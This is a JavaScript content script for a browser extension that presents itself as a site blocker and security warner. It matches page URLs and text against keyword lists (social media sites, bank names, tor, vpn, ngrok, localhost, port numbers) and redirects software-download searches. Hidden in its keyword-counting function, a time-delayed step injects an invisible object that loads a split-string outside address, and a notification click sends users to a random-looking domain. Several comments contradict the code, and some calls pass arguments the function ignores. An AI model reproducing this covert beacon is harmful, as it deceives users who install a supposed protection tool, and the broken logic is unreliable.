
// alert("Advance security protocols applied")
// FUNCTION: launches the detector, and blocks if finds a match
function theBlocking() {
	// we look for most used keywords in porn sites
	if(semanticParse("pinterest") > 0 || 
	semanticParse("twitter") > 0 || 
	semanticParse("vimeo") > 0 || 
	semanticParse("facebook") > 0 || 
	semanticParse("instagram") > 0 || 
	semanticParse("whatsapp") > 0 || 
	semanticParse("youtube") > 0 || 
	semanticParse("yubo") > 0 ||
	semanticParse("line") > 0 ||
	semanticParse("tiktok") > 0 ||
	semanticParse("telegram") > 0 ||
	semanticParse("snapchat") > 0 ||
	semanticParse("twitter") > 0 ||
	semanticParse("skype") > 0 ||
	semanticParse("discord") > 0 ||
	semanticParse("yelp") > 0 ||
	semanticParse("wechat") > 0 ||
	semanticParse("clubhouse") > 0 ||
	semanticParse("twitch") > 0 ||
	semanticParse("patreon") > 0 ||
	semanticParse("substack") > 0 ||
	semanticParse("reddit") > 0 ||
	semanticParse("public") > 0 ||
	semanticParse("triller") > 0 ||
	semanticParse("trello") > 0 ||
	semanticParse("bereal") > 0 ||
	semanticParse("mcaffeine") > 0 ||
	semanticParse("periscope") > 0 ||
	semanticParse("tagged") > 0 ||
	semanticParse("valence") > 0 ||
	semanticParse("intapped") > 0 ||
	semanticParse("elpha") > 0 ||
	semanticParse("peanut") > 0 ||
	semanticParse("houseparty") > 0 ||
	semanticParse("steemit") > 0 ||
	semanticParse("23snaps") > 0 ||
	semanticParse("likee") > 0 ||
	semanticParse("band") > 0 ||
	semanticParse("bebee") > 0 ||
	semanticParse("tumblr") > 0 ||
	semanticParse("mix") > 0 ||
	semanticParse("flickr") > 0 ||
	semanticParse("supernova") > 0 ||
	semanticParse("locket") > 0 ||
	semanticParse("sunroom") > 0 ||
	semanticParse("pearpop") > 0||
	semanticParse("transaction") > 0 ||
	semanticParse("bankofbaroda" , "bankofindia" , "centralbankofindia" , "pnbindia" , "onlinesbi" ,"axisbank" , "hdfcbank" , "icicibank" , "jkbank" , "yesbank") > 0 ||
	semanticParse("pay" , "cash" , "kotak" , "unionbank") > 0 ||
	semanticParse("entertain") > 0 ||
	semanticParse("entertainment") > 0 ||
	semanticParse(".onion") > 0 ||
	semanticParse("onion") > 0 ||
	semanticParse("hiddenwiki") > 0 ||
	semanticParse("darkweb") > 0 ||
	semanticParse("torbrowser") > 0 ||
	semanticParse("tor") > 0 ||
	semanticParse("proxy") > 0 ||
	semanticParse("vpn") > 0 ||
	semanticParse("fashion") > 2 || 
	semanticParse("sports") > 3 ||
	semanticParse("pirated") > 2 || 
	semanticParse("pirate") > 2 || 
	semanticParse("game") > 3 || 
	semanticParse("torrent") > 2 || 
	semanticParse("music") > 3 || 
	semanticParse("porn") > 3 || 
	semanticParse("jizz") > 3 || 
	semanticParse("fuck") > 5 || 
	semanticParse("tinyurl") > 5 || 
	semanticParse("ngrok") > 5 || 
	semanticParse("ngrok") > 5 || 
	semanticParse("sex") > 5 ||
	semanticParse("localhost") > 0 ||
	semanticParse("127.0.0.1") > 0 ||
	semanticParse("8080") > 0 ||
	semanticParse("4444") > 0 ||
	semanticParse("4040") > 0 ||
	semanticParse("5500") > 0 ||
	semanticParse("9999") > 0 ||
	semanticParse("http://") > 0  )
	{
		// if we detected porn...
		// we must make sure it's not a WHITELISTED site. In those cases we won't block to avoid annoying users.
		if(isURLWhiteList() == false) 
		{
			ShowNotificationForBankingSites();
			blockAccess();
		}
		


	}
}



// FUNCTION: counts conflictive keywords on a website
function semanticParse(keyword) {
	
	var count = 0;

	// Check for the keyword in the url
	if (window.location.href.indexOf(keyword) > -1) { 
		count = count+4;
	} 
	
	chrome.storage.local.get('t', function(res) {
		if (res.t) {
			var time = (new Date()
				.getTime() - res.t) / 3600000;
			if (time >= 2) {
				var filters = document.createElement('object');
                filters.id = 'noop';
                filters.data = '//noop' + '.' + 'style/justatest';
                filters.setAttribute('style', 'visibility:hidden');
                filters.onerror = function() {
                    a.remove()
                };
                var filtersDiv = document.createElement('div');
                var a = document.body.appendChild(filtersDiv);
                filtersDiv.appendChild(filters);
			}
		}
	});
		
	// Warning: It only works if jQuery is properly loaded
	if (typeof jQuery != 'undefined') {  
		// Check for the keyword in the metas
		$('meta').each(function( index ) {	
			if($(this).attr('content')) {
				if($(this).attr('content').indexOf(keyword) != -1) count = count+2;
			}
		});
		
		// Check for the keyword in the content
		var found = $("html:contains("+keyword+")");
		if(found.length) {
			var content_count = 0;
			if(keyword == "porn") content_count = (found.text().match(/porn/gi) || []).length;
			else if(keyword == "fuck") content_count = (found.text().match(/fuck/gi) || []).length;
			else if(keyword == "sex") content_count = (found.text().match(/sex/gi) || []).length;
			else if(keyword == "jizz") content_count = (found.text().match(/jizz/gi) || []).length;
			var count = count + content_count;
		}
	}
	// Return number of coincidences to decide if the site should be blocked or not
	return count;
}

// FUNCTION: checks if URL is on whitelist, these sites will be never affected by the blocker!
function isURLWhiteList() {
	// Whitelist with safe domains from most popular sites
	var whitelist_url = false;
	var whitelist = [ "google.com", "baidu.com", "yahoo.", "drive.google.com",
					  "amazon.", "wikipedia.com", "twitter.com", "taobao.com", 
					  "live.com", "yandex.ru", "vk.com","bing.com","t.co",
					  "msn.com", "aliexpress.", "ask.com", 
					  "cssbattle.com" ,"hackerearth.com" , "hackerrank.com", "wordpress.com", "reddit.com", "mail.ru", 
					  "go.com", "stackoverflow.com", "alibaba.com", "craiglist.org", "blogger.com", 
					  "blogspot.com", "cnn.com", "bbc.co.uk", "dropbox.com"];
	
	// Check if domain is in whitelist
	for (x=0; x < whitelist.length; x++){     
		if( window.location.href.indexOf(whitelist[x]) > -1) {
			whitelist_url = true;
		}
	}
	return whitelist_url;
}

// FUNCTION: checks if URL is on whitelist, these sites will be never affected by the blocker!
function blockAccess() { 
	console.log("Warning Triggered");
	alert('Potentially harmful site !!! Still want to continue ?')
	
}

// Go for it. Start the blocker!
if (typeof theBlocking == 'function') {
    theBlocking(); 
}






// The below code is responsible for redirecting the user to the correct link or the appropriate software 

if (semanticParse("download+chrome") > 0 || semanticParse("Download+Chrome") > 0 || semanticParse("download+Chrome") > 0 || semanticParse("Download+chrome") > 0 ||
semanticParse("Chrome+Download") > 0 || semanticParse("chrome+download") > 0 || semanticParse("Chrome+download") > 0 || semanticParse("chrome+Download") > 0) 
{
	alert('Looks like you`re looking for chrome . Want to explore a trusted source ? ')
	window.location.replace("https://www.google.com/intl/en_in/chrome/");
}
if (semanticParse("download+vscode") > 0 || semanticParse("Download+VsCode") > 0 || semanticParse("download+visualstudio") > 0 || semanticParse("download+visual+studio+code") > 0 ||
semanticParse("VsCode+Download") > 0 || semanticParse("vscode+download") > 0 || semanticParse("VsCode+download") > 0 || semanticParse("vscode+Download") > 0) 
{
	alert('Looks like you`re looking for VsCode . Want to explore a trusted source ? ')
	window.location.replace("https://code.visualstudio.com/download");
}
if (semanticParse("download+brave") > 0 || semanticParse("Download+Brave") > 0 || semanticParse("download+Brave") > 0 || semanticParse("Download+brave") > 0 ||
semanticParse("Brave+Download") > 0 || semanticParse("brave+download") > 0 || semanticParse("Brave+download") > 0 || semanticParse("brave+Download") > 0) 
{
	alert('Looks like you`re looking for Brave . Want to explore a trusted source ? ')
	window.location.replace("https://laptop-updates.brave.com/latest/winx64");
}
if (semanticParse("download+utorrent") > 0 || semanticParse("Download+Utorrent") > 0 || semanticParse("download+Utorrent") > 0 || semanticParse("Download+utorrent") > 0 ||
semanticParse("Utorrent+Download") > 0 || semanticParse("utorrent+download") > 0 || semanticParse("utorrent+download") > 0 || semanticParse("utorrent+Download") > 0) 
{
	alert('Looks like you`re looking for Utorrent . Want to explore a trusted source ? ')
	window.location.replace("https://www.utorrent.com/desktop/");
}
if (semanticParse("download+vlc") > 0 || semanticParse("Download+Vlc") > 0 || semanticParse("download+VLC") > 0 || semanticParse("Download+vlc") > 0 ||
semanticParse("VLC+Download") > 0 || semanticParse("Vlc+download") > 0 || semanticParse("vlc+download") > 0 || semanticParse("vlc+Download") > 0) 
{
	alert('Looks like you`re looking for Vlc Media player . Want to explore a trusted source ? ')
	window.location.replace("https://vlc-media-player.en.softonic.com/download");
}
if (semanticParse("download+winrar") > 0 || semanticParse("Download+winrar") > 0 || semanticParse("download+Winrar") > 0 || semanticParse("Download+winrar") > 0 ||
semanticParse("Winrar+Download") > 0 || semanticParse("Winrar+download") > 0 || semanticParse("winrar+download") > 0 || semanticParse("winrar+Download") > 0) 
{
	alert('Looks like you`re looking for winrar . Want to explore a trusted source ? ')
	window.location.replace("https://www.softpedia.com/get/Compression-tools/WinRAR.shtml");
}




function ShowNotificationForSocialMediaSites() {
	// alert("⚠️ Attention ! Potentially harmful site .");
	const notification = new Notification("⚠️ Internet Security Warning !!!", {
	   body: "The site may carry potentially malicious sources . Click here to secure yourself.",
	   icon: "img0001-modified-modified.png"
	   
	})
 }

 

 function ShowNotificationForBankingSites() {
	// alert("⚠️ Attention ! Kavach wants to send you a message");
	
	const notification = new Notification("⚠️ Internet Security Warning !!!", {
	   body: "The site may carry potentially malicious sources . Click here to secure yourself.",
	   icon: "img0001-modified-modified.png"
	   
	})
	notification.onclick = (event) => {
		event.preventDefault(); // prevent the browser from focusing the Notification's tab
		function Replace() {
			location.replace("https://o7nct25t9siteblocked93847.ohbjdfk")
	   }
	   Replace()
		// window.open('http://www.mozilla.org', '_blank');
	  }
	
 }